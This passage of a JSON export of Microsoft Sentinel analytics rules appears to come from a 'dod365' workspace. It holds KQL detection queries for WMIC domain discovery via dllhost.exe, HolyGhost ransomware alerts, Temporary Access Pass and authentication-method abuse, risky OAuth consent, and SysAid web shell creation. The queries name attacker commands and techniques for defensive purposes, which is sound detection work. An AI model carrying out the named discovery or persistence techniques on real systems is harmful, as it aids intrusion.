365\nMITRE:TA0009;T1114;T1114.002;T1114.003","alertRuleTemplateName":"3b05727d-a8d1-477d-bbdd-d957da96ac7b","lastModifiedUtc":"2024-10-02T21:33:49.6365329Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/807d7cec-43e3-4c5e-9321-e89012d9f7a0","name":"807d7cec-43e3-4c5e-9321-e89012d9f7a0","etag":"\"87001561-0000-2700-0000-66fdc22e0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT6H","queryPeriod":"PT6H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"(union isfuzzy=true\n(SecurityEvent\n| where EventID==4688\n| where CommandLine has \"wmic computersystem get domain\" and ParentProcessName has \"dllhost.exe\"\n| project TimeGenerated, HostCustomEntity = Computer, AccountCustomEntity = Account, AccountDomain, ProcessName, ProcessNameFullPath = NewProcessName, EventID, Activity, CommandLine, EventSourceName, Type\n),\n(DeviceProcessEvents \n| where ProcessCommandLine has \"wmic computersystem get domain\" and InitiatingProcessFileName =~ \"dllhost.exe\" and InitiatingProcessCommandLine has \"dllhost.exe\"\n| extend timestamp = TimeGenerated, AccountCustomEntity =  InitiatingProcessAccountName, HostCustomEntity = DeviceName\n)\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Discovery","DefenseEvasion","PrivilegeEscalation"],"techniques":["T1087","T1055"],"displayName":"Dev-0270 WMIC  Discovery","enabled":true,"description":"The query below identifies dllhost.exe using WMIC to discover additional hosts and associated domains in the environment.\nPLATFORM:Microsoft 365\nMITRE:TA0007;T1087;T1087.003;T1087.004","alertRuleTemplateName":"6b652b4f-9810-4eec-9027-7aa88ce4db23","lastModifiedUtc":"2024-10-02T21:59:09.3274291Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/8e5c9d92-ba38-42ac-8af6-45b0748526c9","name":"8e5c9d92-ba38-42ac-8af6-45b0748526c9","etag":"\"2801c4f0-0000-2700-0000-65a99e980000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let Dev0530_threats = dynamic([\"Trojan:Win32/SiennaPurple.A\", \"Ransom:Win32/SiennaBlue.A\", \"Ransom:Win32/SiennaBlue.B\"]);\nSecurityAlert\n| where ProviderName == \"MDATP\"\n| extend ThreatName = tostring(parse_json(ExtendedProperties).ThreatName)\n| extend ThreatFamilyName = tostring(parse_json(ExtendedProperties).ThreatFamilyName)\n| where ThreatName in~ (Dev0530_threats) or ThreatFamilyName in~ (Dev0530_threats)\n| extend CompromisedEntity = tolower(CompromisedEntity)\n| join kind=inner (DeviceInfo\n    | extend DeviceName = tolower(DeviceName)\n) on $left.CompromisedEntity == $right.DeviceName\n| summarize by DisplayName, ThreatName, ThreatFamilyName, PublicIP, AlertSeverity, Description, tostring(LoggedOnUsers), DeviceId, TenantId , bin(TimeGenerated, 1d), CompromisedEntity, tostring(LoggedOnUsers), ProductName, Entities","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"CompromisedEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"PublicIP"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Execution","DefenseEvasion","Collection","Exfiltration","Impact"],"techniques":["T1190","T1189","T1059","T1036","T1140","T1119","T1041","T1486"],"displayName":"AV detections related to Dev-0530 actors","enabled":true,"description":"This query looks for Microsoft Defender AV detections related to Dev-0530 actors. In Microsoft Sentinel the SecurityAlerts table includes only the Device Name of the affected device, this query joins the DeviceInfo table to clearly connect other information such as Device group, ip, logged on users etc. This would allow the Microsoft Sentinel analyst to have more context related to the alert, if available. https://www.microsoft.com/en-us/security/blog/2022/07/14/north-korean-threat-actor-targets-small-and-midsize-businesses-with-h0lygh0st-ransomware/                                                                                                                                                                                                                                                The HolyGhost ransomware uses a hybrid encryption approach and exfiltrates their victim’s sensitive data for double extortion [3]. The HolyGhost group also moves laterally in the compromised network to infect other hosts to amplify its impact. HolyGhost ransomware has multiple variants written in different languages, such as C++ and Go. The ransomware is known to be affiliated with the North Korean threat group PLUTONIUM (aka DarkSeoul or Andariel).         https://www.picussecurity.com/resource/blog/cisa-alert-aa23-040a-maui-and-holyghost-ransomware-target-critical-infrastructure","alertRuleTemplateName":"5f171045-88ab-4634-baae-a7b6509f483b","lastModifiedUtc":"2024-01-18T21:56:39.6467098Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/8345cebb-cc08-46f6-858f-871236e606c8","name":"8345cebb-cc08-46f6-858f-871236e606c8","etag":"\"1b00f4c4-0000-2700-0000-66d8a56a0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let admin_users = (IdentityInfo\n    | summarize arg_max(TimeGenerated, *) by AccountUPN\n    | where AssignedRoles contains \"admin\"\n    | summarize by tolower(AccountUPN));\nAuditLogs\n| where OperationName =~ \"Admin registered security info\"\n| where ResultReason =~ \"Admin registered temporary access pass method for user\"\n| extend userPrincipalName = tostring(TargetResources[0].userPrincipalName)\n| where tolower(userPrincipalName) in (admin_users)\n\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"customDetails":{},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"userPrincipalName"}]}],"alertDetailsOverride":{"alertDynamicProperties":[]},"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence"],"techniques":["T1136"],"displayName":"Addition of a Temporary Access Pass to a Privileged Account","enabled":true,"description":"Detects when a Temporary Access Pass (TAP) is created for a Privileged Account.\n  A Temporary Access Pass is a time-limited passcode issued by an admin that satisfies strong authentication requirements and can be used to onboard other authentication methods, including Passwordless ones such as Microsoft Authenticator or even Windows Hello.\n  A threat actor could use a TAP to register a new authentication method to maintain persistance to an account.\n  Review any TAP creations to ensure they were used legitimately.\n  Ref: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-privileged-accounts#changes-to-privileged-accounts\n\nPLATFORM:Azure AD,Microsoft 365,IaaS;MITRE:TA0003;T1136;T1136.003","alertRuleTemplateName":"d7feb859-f03e-4e8d-8b21-617be0213b13","lastModifiedUtc":"2024-09-04T18:22:32.9163025Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ffd1ca12-5724-432c-baa8-c76077dd7409","name":"ffd1ca12-5724-432c-baa8-c76077dd7409","etag":"\"8700ce52-0000-2700-0000-66fdc1360000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"AuditLogs\n  | where OperationName has \"Consent to application\"\n  | where Result =~ \"failure\"\n  | extend ipAddress = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress)\n  | extend userPrincipalName = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n  | extend userAgent = iif(AdditionalDetails[0].key == \"User-Agent\", tostring(AdditionalDetails[0].value), tostring(AdditionalDetails[1].value))\n  | where isnotempty(TargetResources)\n  | extend AppName = tostring(TargetResources[0].displayName)\n  | mv-expand TargetResources[0].modifiedProperties\n  | extend TargetResources_0_modifiedProperties = columnifexists(\"TargetResources_0_modifiedProperties\", '')\n  | where isnotempty(TargetResources_0_modifiedProperties)\n  | where TargetResources_0_modifiedProperties.displayName =~ \"MethodExecutionResult.\"\n  | extend FailureReason = tostring(parse_json(tostring(TargetResources_0_modifiedProperties.newValue)))\n  | where FailureReason contains \"Risky\"\n  | project-reorder TimeGenerated, OperationName, Result, AppName, FailureReason, userPrincipalName, userAgent, ipAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ipAddress"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"userPrincipalName"}]}],"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","PrivilegeEscalation"],"techniques":["T1078"],"displayName":"End-user consent stopped due to risk-based consent","enabled":true,"description":"Detects a user's consent to an OAuth application being blocked due to it being too risky.\n  These events should be investigated to understand why the user attempted to consent to the applicaiton and what other applicaitons they may have consented to.\n  Ref: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-applications#end-user-stopped-due-to-risk-based-consent\nPLATFORM:Azure AD,IaaS,Microsoft 365\nMITRE:TA0003;T1098;T1098.001;T1098.003,TA0040;T1499;T1499.004","alertRuleTemplateName":"009b9bae-23dd-43c4-bcb9-11c4ba7c784a","lastModifiedUtc":"2024-10-02T21:55:01.8745724Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/fc06447f-a4d5-459b-9ac6-5ba9e2ce9413","name":"fc06447f-a4d5-459b-9ac6-5ba9e2ce9413","etag":"\"8700a44c-0000-2700-0000-66fdc0cb0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let queryfrequency = 1h;\nlet queryperiod = 1d;\nAuditLogs\n| where TimeGenerated > ago(queryperiod)\n| where OperationName in (\"Invite external user\", \"Bulk invite users - started (bulk)\", \"Invite external user with reset invitation status\")\n| extend InitiatedBy = iff(isnotempty(InitiatedBy.user.userPrincipalName), InitiatedBy.user.userPrincipalName, InitiatedBy.app.displayName)\n// Uncomment the following line to filter events where the inviting user was a guest user\n//| where InitiatedBy has_any (\"live.com#\", \"#EXT#\")\n| mv-apply TargetResource = TargetResources on \n  (\n      where TargetResource.type =~ \"User\"\n      | extend InvitedUser = tostring(TargetResource.userPrincipalName)\n  )\n| mv-expand UserToCompare = pack_array(InitiatedBy, InvitedUser) to typeof(string)\n| where UserToCompare has_any (\"live.com#\", \"#EXT#\")\n| extend\n    parsedUser = replace_string(tolower(iff(UserToCompare startswith \"live.com#\", tostring(split(UserToCompare, \"#\")[1]), tostring(split(UserToCompare, \"#EXT#\")[0]))), \"@\", \"_\"),\n    InvitationTime = TimeGenerated\n| join (\n    (union isfuzzy=true SigninLogs, AADNonInteractiveUserSignInLogs)\n    | where TimeGenerated > ago(queryfrequency)\n    | where UserType != \"Member\"\n    | where AppId has_any                       // This web may contain a list of these apps: https://msshells.net/\n        (\"1b730954-1685-4b74-9bfd-dac224a7b894\",// Azure Active Directory PowerShell\n         \"04b07795-8ddb-461a-bbee-02f9e1bf7b46\",// Microsoft Azure CLI\n         \"1950a258-227b-4e31-a9cf-717495945fc2\",// Microsoft Azure PowerShell\n         \"a0c73c16-a7e3-4564-9a95-2bdf47383716\",// Microsoft Exchange Online Remote PowerShell\n         \"fb78d390-0c51-40cd-8e17-fdbfab77341b\",// Microsoft Exchange REST API Based Powershell\n         \"d1ddf0e4-d672-4dae-b554-9d5bdfd93547\",// Microsoft Intune PowerShell\n         \"9bc3ab49-b65d-410a-85ad-de819febfddc\",// Microsoft SharePoint Online Management Shell\n         \"12128f48-ec9e-42f0-b203-ea49fb6af367\",// MS Teams Powershell Cmdlets\n         \"23d8f6bd-1eb0-4cc2-a08c-7bf525c67bcd\",// Power BI PowerShell\n         \"31359c7f-bd7e-475c-86db-fdb8c937548e\",// PnP Management Shell\n         \"90f610bf-206d-4950-b61d-37fa6fd1b224\",// Aadrm Admin Powershell\n         \"14d82eec-204b-4c2f-b7e8-296a70dab67e\" // Microsoft Graph PowerShell\n        )\n    | summarize arg_min(TimeGenerated, *) by UserPrincipalName\n    | extend\n        parsedUser = replace_string(UserPrincipalName, \"@\", \"_\"),\n        SigninTime = TimeGenerated\n    )\n    on parsedUser\n| project InvitationTime, InitiatedBy, OperationName, InvitedUser, SigninTime, SigninCategory = Category1, SigninUserPrincipalName = UserPrincipalName, IPAddress, AppDisplayName, ResourceDisplayName, UserAgent, InvitationAdditionalDetails = AdditionalDetails, InvitationTargetResources = TargetResources\n| extend InvitedUserName = tostring(split(InvitedUser,'@',0)[0]), InvitedUserUPNSuffix = tostring(split(InvitedUser,'@',1)[0]), \n         InitiatedByName = tostring(split(InitiatedBy,'@',0)[0]), InitiatedByUPNSuffix = tostring(split(InitiatedBy,'@',1)[0])","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"InvitedUserName"},{"identifier":"UPNSuffix","columnName":"InvitedUserUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"InitiatedByName"},{"identifier":"UPNSuffix","columnName":"InitiatedByUPNSuffix"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"templateVersion":"1.0.7","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Persistence","Discovery"],"techniques":["T1078","T1136","T1087"],"displayName":"External guest invitation followed by Azure AD PowerShell signin","enabled":true,"description":"By default guests have capability to invite more external guest users, guests also can do suspicious Azure AD enumeration. This detection look at guests\nusers, who have been invited or have invited recently, who also are logging via various PowerShell CLI.\nRef : 'https://danielchronlund.com/2021/11/18/scary-azure-ad-tenant-enumeration-using-regular-b2b-guest-accounts/\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.004,TA0002;T1059;T1059.009,TA0003;T1136;T1136.003,TA0007;T1087;T1087.004","alertRuleTemplateName":"acc4c247-aaf7-494b-b5da-17f18863878a","lastModifiedUtc":"2024-10-02T21:53:15.0907219Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/34195f82-3216-41dc-8f72-1b84cbb800e1","name":"34195f82-3216-41dc-8f72-1b84cbb800e1","etag":"\"8600d607-0000-2700-0000-66fdae4d0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let lookback = 1d;\nAuditLogs \n| where TimeGenerated > ago(lookback)\n| where OperationName=~ \"Update user\" \n| where Result =~ \"success\" \n| mv-expand TargetResources \n| mv-expand TargetResources.modifiedProperties \n| extend displayName_ = tostring(TargetResources_modifiedProperties.displayName) , oldValue_ = tostring(TargetResources_modifiedProperties.oldValue), newValue_ = tostring(TargetResources_modifiedProperties.newValue)\n| where displayName_ == \"UserPrincipalName\" and oldValue_ !has \"#EXT\" and newValue_ has \"#EXT\"\n| extend InitiatingApp = tostring(parse_json(tostring(InitiatedBy.app)).displayName) \n| extend Initiator = iif(isnotempty(InitiatingApp), InitiatingApp, tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)) , IPAddress = tostring(InitiatedBy.[\"user\"].[\"ipAddress\"])\n| project TimeGenerated, AADTenantId, IPAddress, Initiator, displayName_, oldValue_, newValue_","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Initiator"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"displayName_"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["PrivilegeEscalation"],"techniques":["T1078"],"displayName":"Suspicious linking of existing user to external User","enabled":true,"description":"This query will detect when an attempt is made to update an existing user and link it to an guest or external identity. These activities are unusual and such linking of external \nidentities should be investigated. In some cases you may see internal AAD sync accounts (Sync_) do this which may be benign\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.004,TA0003;T1098;T1098.003,TA0005;T1078;T1078.004","alertRuleTemplateName":"22a320c2-e1e5-4c74-a35b-39fc9cdcf859","lastModifiedUtc":"2024-10-02T20:34:19.8762548Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ddaae710-31d5-4ea7-a317-7d774fd3090d","name":"ddaae710-31d5-4ea7-a317-7d774fd3090d","etag":"\"87009e07-0000-2700-0000-66fdbc5a0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"NRT","properties":{"severity":"Medium","query":"SigninLogs\n| where ResultType == 500121\n| extend additionalDetails_ = tostring(Status.additionalDetails)\n| where additionalDetails_ =~ \"MFA denied; user declined the authentication\"\n| summarize StartTime = min(TimeGenerated), EndTIme = max(TimeGenerated) by UserPrincipalName, UserId, AADTenantId, IPAddress\n| extend Name = tostring(split(UserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(UserPrincipalName,'@',1)[0])","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"},{"identifier":"AadUserId","columnName":"UserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"templateVersion":"1.0.3","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1078"],"displayName":"NRT MFA Rejected by User","enabled":true,"description":"Identifies occurrences where a user has rejected an MFA prompt. This could be an indicator that a threat actor has compromised the username and password of this user account and is using it to try and log into the account.\nRef : https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-user-accounts#monitoring-for-failed-unusual-sign-ins\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0003;T1136;T1136.003,TA0006;T1110;T1110.001,TA0007;T1087;T1087.004","alertRuleTemplateName":"3617d76d-b15e-4c6f-985e-a1dac73c592d","lastModifiedUtc":"2024-10-02T21:34:17.7947037Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/0f5e7c9a-558d-4a61-9f39-d4a3d2bb00d9","name":"0f5e7c9a-558d-4a61-9f39-d4a3d2bb00d9","etag":"\"87002c3f-0000-2700-0000-66fdbfe20000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let timeframe = 1d;\nlet time_window = 5m;\n(union isfuzzy=true\n(SecurityEvent\n| where TimeGenerated > ago(timeframe)\n| where EventID == 4688\n| where Process has_any (\"java.exe\", \"javaw.exe\") and CommandLine has \"SysAidServer\" \n| summarize by ParentProcessName,Process, Account, Computer, CommandLine, timekey= bin(TimeGenerated, time_window), TimeGenerated, SubjectLogonId\n| join kind=inner(\nSecurityEvent\n| where TimeGenerated > ago(timeframe)\n| where EventID == 4663\n| where Process has_any (\"java.exe\", \"javaw.exe\")\n| where AccessMask in ('0x2','0x100', '0x10', '0x4')\n| where ObjectName endswith \".jsp\" \n| summarize by ParentProcessName, Account, Computer, ObjectName, ProcessName, timekey= bin(TimeGenerated, time_window), TimeGenerated, SubjectLogonId)\n on timekey, Computer, SubjectLogonId\n| extend timestamp = TimeGenerated, AccountCustomEntity = Account, HostCustomEntity = Computer\n),\n(DeviceFileEvents \n| where InitiatingProcessFileName has_any (\"java.exe\", \"javaw.exe\")  \n| where InitiatingProcessCommandLine has \"SysAidServer\"  \n| where FileName endswith \".jsp\" \n| extend timestamp = TimeGenerated, AccountCustomEntity = InitiatingProcessAccountName, HostCustomEntity = DeviceName\n),\n(imFileEvent\n| where TimeGenerated > ago(timeframe)\n| where EventType == \"FileCreated\"\n| where ActingProcessName has_any (\"java.exe\", \"javaw.exe\") \n| where ActingProcessCommandLine has \"SysAidServer\"  \n| where FilePath endswith \".jsp\" \n| extend timestamp = TimeGenerated, AccountCustomEntity = ActorUsername, HostCustomEntity = DvcHostname\n)\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]}],"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Persistence"],"techniques":["T1190","T1505"],"displayName":"Identify SysAid Server web shell creation","enabled":true,"description":"This query looks for potential webshell creation by the threat actor Mercury after the sucessful exploitation of SysAid server. \nReference:  https://www.microsoft.com/security/blog/2022/08/25/mercury-leveraging-log4j-2-vulnerabilities-in-unpatched-systems-to-target-israeli-organizations/\n\nInitial Access, Execution, Persistence, Privilege Escalation, Defense Evasion\n\nT1190: Exploit Public-Facing Application,T1505: Server Software Component:T1505.003\nPLATFORM:IaaS,Azure AD,Microsoft 365\nMITRE:TA0002;T1059;T1059.009","alertRuleTemplateName":"50eb4cbd-188f-44f4-b964-bab84dcdec10","lastModifiedUtc":"2024-10-02T21:49:21.105741Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/b6bfc85a-ec1f-4d97-a81a-415c34b24b03","name":"b6bfc85a-ec1f-4d97-a81a-415c34b24b03","etag":"\"88002d2b-0000-2700-0000-66fdcf940000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT2H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let VIPUsers = (IdentityInfo\n| where AssignedRoles contains \"Admin\"\n| summarize by tolower(AccountUPN));\nAuditLogs\n| where TimeGenerated > ago(2h)\n| where Category =~ \"UserManagement\"\n| where ActivityDisplayName =~ \"User registered security info\"\n| where LoggedByService =~ \"Authentication Methods\"\n| extend TargetUserPrincipalName = tostring(TargetResources[0].userPrincipalName)\n| where tolower(TargetUserPrincipalName) in (VIPUsers)\n| extend TargetAadUserId = tostring(TargetResources[0].id)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIPAddress = tostring(InitiatedBy.user.ipAddress)\n| extend TargetAccountName = tostring(split(TargetUserPrincipalName, \"@\")[0]), TargetAccountUPNSuffix = tostring(split(TargetUserPrincipalName, \"@\")[1])\n| extend InitiatingAccountName = tostring(split(InitiatingUserPrincipalName, \"@\")[0]), InitiatingAccountUPNSuffix = tostring(split(InitiatingUserPrincipalName, \"@\")[1])\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"TargetUserPrincipalName"},{"identifier":"Name","columnName":"TargetAccountName"},{"identifier":"UPNSuffix","columnName":"TargetAccountUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"TargetAadUserId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingUserPrincipalName"},{"identifier":"Name","columnName":"InitiatingAccountName"},{"identifier":"UPNSuffix","columnName":"InitiatingAccountUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatingAadUserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"InitiatingIPAddress"}]}],"templateVersion":"1.0.5","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence"],"techniques":["T1098"],"displayName":"Authentication Method Changed for Privileged Account","enabled":true,"description":"Identifies authentication methods being changed for a privileged account. This could be an indication of an attacker adding an auth method to the account so they can have continued access.\nRef : https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-privileged-accounts#things-to-monitor-1\nPLATFORM:Azure AD,IaaS,Microsoft 365\nMITRE:TA0003;T1098;T1098.001;T1098;T1098.003;T1098.005","alertRuleTemplateName":"feb0a2fb-ae75-4343-8cbc-ed545f1da289","lastModifiedUtc":"2024-10-02T22:56:19.5734288Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/e278bc5b-6695-4faf-8bb8-2870a58dfedf","name":"e278bc5b-6695-4faf-8bb8-2870a58dfedf","etag":"\"8800f01a-0000-2700-0000-66fdce700000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Microsoft Entra ID Connect Health Agent - cf6d7e68-f018-4e0a-a7b3-126e053fb88d\n// Microsoft Entra ID Connect - cb1056e2-e479-49de-ae31-7812af012ed8\nlet appList = dynamic(['cf6d7e68-f018-4e0a-a7b3-126e053fb88d','cb1056e2-e479-49de-ae31-7812af012ed8']);\nlet operationNamesList = dynamic(['Microsoft.ADHybridHealthService/services/servicemembers/action','Microsoft.ADHybridHealthService/services/delete']);\nAzureActivity\n| where CategoryValue =~ 'Administrative'\n| where ResourceProviderValue =~ 'Microsoft.ADHybridHealthService'\n| where _ResourceId has 'AdFederationService'\n| where OperationNameValue in~ (operationNamesList)\n| extend claimsJson = parse_json(Claims)\n| extend AppId = tostring(claimsJson.appid), AccountName = tostring(claimsJson.name), Name = tostring(split(Caller,'@',0)[0]), UPNSuffix = tostring(split(Caller,'@',1)[0])\n| where AppId !in (appList)\n| project-away 